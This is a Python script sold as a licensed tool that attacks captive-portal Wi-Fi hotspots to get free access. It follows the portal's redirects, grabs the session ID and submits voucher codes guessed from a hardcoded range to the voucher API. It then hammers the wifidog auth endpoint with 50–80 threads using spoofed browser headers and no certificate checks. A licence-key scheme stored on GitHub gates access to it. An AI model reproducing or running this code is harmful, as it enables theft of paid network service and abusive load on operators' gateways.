import requests, re, urllib3, time, threading, os, random, subprocess, json, sys, socket, hashlib, base64
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, timedelta

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
REPO_OWNER = "ShineLiveTV"
REPO_NAME = "my-keys-main"
VIP_URL = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/Koclay.txt"
KEYS_URL = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/keys.txt"
HISTORY_FILE = "key_history.txt"
LOCAL_KEY_FILE = ".saved_key.txt"
GITHUB_TOKEN_FILE = ".gh_token.txt"
USER_NAME, EXP_DATE, AUTHORIZED = "Me", "--", False
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

AI_STATUS = "Discovery"
LAST_PING = 0
STOP_THREADS = threading.Event()

def get_device_id():
    try:
        uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
        hash_id = hashlib.md5(uid.encode()).hexdigest().upper()[:8]
        return f"DEV-{hash_id}"
    except:
        return "DEV-UNKNOWN"

def get_device_info():
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
        if not model: model = "Android Device"
        return get_device_id(), model
    except:
        return get_device_id(), "Android Device"

def check_key(user_key):
    try:
        uid = get_device_id()
        res = requests.get(f"{KEYS_URL}?cb={random.random()}", timeout=7)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if '|' in line:
                    parts = line.split('|')
                    stored_key = parts[0].strip()
                    exp_dt_str = parts[1].strip()
                    locked_id = parts[2].strip() if len(parts) > 2 else "ALL"
                    
                    if user_key == stored_key:
                        if locked_id != "ALL" and locked_id != uid:
                            return False, "Locked to another device"
                        exp_dt = datetime.strptime(exp_dt_str, '%Y-%m-%d %H:%M:%S')
                        if datetime.now() < exp_dt:
                            return True, exp_dt_str
                        else:
                            return False, "Expired"
        return False, "Invalid"
    except:
        return False, "Error"

def update_status():
    global USER_NAME, EXP_DATE, AUTHORIZED
    try:
        uid = get_device_id()
        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=7)
        if res.status_code == 200:
            for line in res.text.splitlines():
                raw_uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
                if uid in line or raw_uid in line:
                    parts = line.split('|')
                    v_name, exp_dt = parts[1].strip(), parts[2].strip()
                    USER_NAME, EXP_DATE, AUTHORIZED = v_name, exp_dt, True
                    return
    except:
        pass

def banner():
    uid, model = get_device_info()
    os.system('clear')
    print("\033[93m" + "="*42)
    print("\033[43m  \033[42m  \033[41m  \033[0m \033[96m" + " SHINE KOKO MASTER ULTIMATE V3.5 " + "\033[41m  \033[42m  \033[43m  \033[0m")
    print("\033[96m" + r'''
     ██████  ██   ██ ██ ███    ██ ███████ 
    ██      ██   ██ ██ ████   ██ ██      
    ███████ ███████ ██ ██ ██  ██ █████   
         ██ ██   ██ ██ ██  ██ ██ ██      
    ███████ ██   ██ ██ ██   ████ ███████ 
                                         
     ██   ██  ██████  ██   ██  ██████  
     ██  ██  ██    ██ ██  ██  ██    ██ 
     █████   ██    ██ █████   ██    ██ 
     ██  ██  ██    ██ ██  ██  ██    ██ 
     ██   ██  ██████  ██   ██  ██████  
    ''')
    print(f"\033[94m 📱 DEVICE: {model} | ID: \033[93m{uid}")
    print(f"\033[95m 👑 MASTER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE}")
    print("\033[93m" + "="*42 + "\033[0m")

def save_to_history(key_line):
    with open(HISTORY_FILE, "a") as f:
        f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {key_line}\n")

def view_history():
    os.system('clear')
    print("\033[96m" + "="*50)
    print("      📜 KEY GENERATION HISTORY & STATUS")
    print("="*50 + "\033[0m")
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r") as f:
            lines = f.readlines()
            if not lines:
                print("\033[91m [!] No history found.\033[0m")
            else:
                for line in lines[-15:]:
                    line = line.strip()
                    if '|' in line:
                        parts = line.split('|')
                        exp_str = parts[2].strip()
                        exp_dt = datetime.strptime(exp_str, '%Y-%m-%d %H:%M:%S')
                        status = "\033[92m[ACTIVE]\033[0m" if datetime.now() < exp_dt else "\033[91m[EXPIRED]\033[0m"
                        print(f" {status} \033[97m{line}\033[0m")
    else:
        print("\033[91m [!] No history file found.\033[0m")
    print("\033[96m" + "="*50 + "\033[0m")
    input("\n\033[97m [~] Press Enter to return... \033[0m")

def update_github_keys(new_line):
    if not os.path.exists(GITHUB_TOKEN_FILE):
        print("\033[91m [!] GitHub Token not found. Please set it up first.\033[0m")
        token = input("\033[97m [?] Enter GitHub Token: \033[92m").strip()
        with open(GITHUB_TOKEN_FILE, "w") as f: f.write(token)
    
    with open(GITHUB_TOKEN_FILE, "r") as f: token = f.read().strip()
    
    headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
    api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/keys.txt"
    
    try:
        # Get current file content and SHA
        res = requests.get(api_url, headers=headers)
        if res.status_code == 200:
            data = res.json()
            sha = data['sha']
            current_content = base64.b64decode(data['content']).decode('utf-8')
            new_content = current_content.strip() + "\n" + new_line
            
            # Update file
            payload = {
                "message": f"Add new key: {new_line.split('|')[0].strip()}",
                "content": base64.b64encode(new_content.encode()).decode('utf-8'),
                "sha": sha
            }
            put_res = requests.put(api_url, headers=headers, json=payload)
            if put_res.status_code == 200:
                print("\033[92m [✓] GitHub keys.txt updated automatically!\033[0m")
                return True
            else:
                print(f"\033[91m [✗] Failed to update GitHub: {put_res.status_code}\033[0m")
        else:
            print(f"\033[91m [✗] Failed to get keys.txt from GitHub: {res.status_code}\033[0m")
    except Exception as e:
        print(f"\033[91m [!] Error: {str(e)}\033[0m")
    return False

def admin_key_gen():
    os.system('clear')
    print("\033[96m" + "╔" + "═"*40 + "╗")
    print("║      \033[93mSHINE KOKO ADMIN KEY GENERATOR\033[96m      ║")
    print("╚" + "═"*40 + "╝\033[0m")
    
    key_name = input("\033[97m [?] Enter Key Name: \033[92m").strip()
    target_id = input("\033[97m [?] Target Device ID (Enter for ALL): \033[93m").strip()
    if not target_id: target_id = "ALL"
    
    print("\033[96m\n [1] 1 Hour    [2] 3 Hours    [3] 5 Hours")
    print(" [4] 1 Day     [5] 3 Days     [6] 7 Days")
    print(" [7] 15 Days   [8] 30 Days\033[0m")
    
    choice = input("\033[97m\n [?] Choice: \033[92m")
    durations = {"1":1, "2":3, "3":5, "4":24, "5":72, "6":168, "7":360, "8":720}
    
    if choice in durations:
        expiry = datetime.now() + timedelta(hours=durations[choice])
        exp_str = expiry.strftime('%Y-%m-%d %H:%M:%S')
        final_line = f"{key_name} | {exp_str} | {target_id}"
        save_to_history(final_line)
        
        print(f"\n \033[93m[*] Generated: {final_line}\033[0m")
        print("\033[96m [*] Attempting Auto-Update to GitHub...\033[0m")
        
        if update_github_keys(final_line):
            print("\033[92m\n [✓] Key is now LIVE! User can use it immediately.\033[0m")
        else:
            print("\033[93m\n [!] Auto-Update failed. Please add it manually to GitHub.\033[0m")
            print(f" \033[43m\033[30m {final_line} \033[0m")
            
        input("\n\033[97m [~] Press Enter to return... \033[0m")
    else:
        print("\033[91m [!] Invalid Choice!\033[0m")
        time.sleep(2)

def get_advanced_headers():
    browsers = [
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ]
    return {"User-Agent": random.choice(browsers), "Accept": "*/*", "Connection": "keep-alive"}

def show_ping_live():
    while True:
        if LAST_PING > 0:
            p_color = "\033[92m" if LAST_PING < 110 else "\033[93m" if LAST_PING < 250 else "\033[91m"
            sys.stdout.write(f"\r \033[96m[~] AI: {AI_STATUS} | {p_color}⚡ PING: {LAST_PING}ms          \033[0m")
            sys.stdout.flush()
        time.sleep(0.5)

def turbo_pulse(link, mode):
    global LAST_PING, AI_STATUS
    payload = "shinekoko" * 5
    while not STOP_THREADS.is_set():
        try:
            start = time.time()
            requests.get(link, timeout=5, verify=False, headers=get_advanced_headers(), params={'data': payload})
            LAST_PING = int((time.time() - start) * 1000)
            AI_STATUS = "Stable" if LAST_PING < 250 else "Rescue"
            time.sleep(0.1)
        except:
            AI_STATUS = "Rescue"; time.sleep(0.5)

def launch():
    global AI_STATUS, STOP_THREADS, USER_NAME, EXP_DATE, AUTHORIZED
    uid, _ = get_device_info()
    update_status()
    banner()
    
    raw_uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
    is_admin = (raw_uid == "u0_a304")
    
    if not AUTHORIZED:
        if os.path.exists(LOCAL_KEY_FILE):
            with open(LOCAL_KEY_FILE, "r") as f:
                saved_key = f.read().strip()
            is_valid, info = check_key(saved_key)
            if is_valid:
                USER_NAME, EXP_DATE, AUTHORIZED = "Premium User", info, True
                banner()
            else:
                os.remove(LOCAL_KEY_FILE)
        
        if not AUTHORIZED:
            print("\033[91m [!] License Key Required. \033[0m")
            user_key = input("\033[97m [?] Enter License Key: \033[92m").strip()
            is_valid, info = check_key(user_key)
            if is_valid:
                print(f"\033[92m [✓] Key Accepted! Expires: {info} \033[0m")
                with open(LOCAL_KEY_FILE, "w") as f:
                    f.write(user_key)
                USER_NAME, EXP_DATE, AUTHORIZED = "Premium User", info, True
                time.sleep(2); banner()
            else:
                print(f"\033[91m [✗] Access Denied: {info} \033[0m")
                input("\033[97m [~] Press Enter to exit... \033[0m"); sys.exit()

    while True:
        banner()
        print("\033[92m [1] 🧠 Balanced Mode (穩定) \033[0m")
        print("\033[91m [2] 🔥 Turbo Mode (加速) \033[0m")
        if is_admin:
            print("\033[93m [3] 🔑 Admin: Key Generator (Auto-Update) \033[0m")
            print("\033[94m [4] 📜 View Key History \033[0m")
        
        choice = input("\033[97m\n [?] Select Power: \033[92m")
        
        if is_admin:
            if choice == "3":
                admin_key_gen()
                continue
            elif choice == "4":
                view_history()
                continue
        
        threads = 80 if choice == "2" else 50
        threading.Thread(target=show_ping_live, daemon=True).start()
        session = requests.Session()
        print(f"\n\033[93m[*] Starting SHINE KOKO engine with {threads} threads...\033[0m")
        
        while True:
            try:
                STOP_THREADS.clear()
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
                p_url = r.url
                if "generate_204" not in p_url:
                    parsed = urlparse(p_url)
                    gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
                    r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
                    m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                    n_url = urljoin(p_url, m.group(1)) if m else p_url
                    r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
                    sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                    if sid:
                        v_code = random.choice(VOUCHER_LIST)
                        session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
                                    json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
                                    timeout=5, headers=get_advanced_headers())
                        auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
                        print(f"\n\033[92m[*] ⚡ BYPASS SUCCESS! ⚡\033[0m")
                        for _ in range(threads):
                            threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                        while True:
                            time.sleep(1)
                            try:
                                if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: raise Exception()
                            except: break
                        STOP_THREADS.set()
                else:
                    AI_STATUS = "Online"; time.sleep(5)
            except:
                AI_STATUS = "Rescue"; time.sleep(2)

if __name__ == "__main__":
    try: launch()
    except KeyboardInterrupt: sys.exit()
